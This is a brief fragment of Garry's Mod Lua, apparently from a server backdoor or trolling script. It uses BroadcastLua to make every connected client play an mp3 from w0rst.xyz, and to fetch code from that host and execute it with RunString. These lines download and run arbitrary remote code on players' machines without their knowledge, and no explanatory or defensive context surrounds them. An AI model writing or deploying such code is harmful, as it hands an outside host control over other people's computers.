...
BroadcastLua("sound.PlayURL('https://w0rst.xyz/script/extra/require/mlg.mp3', 'mono', function(station) station:Play() end)")
...
BroadcastLua("http.Fetch('https://w0rst.xyz/script/extra/require/logopopup', RunString)")
BroadcastLua("http.Fetch('https://w0rst.xyz/script/extra/require/floatingfood', RunString)")
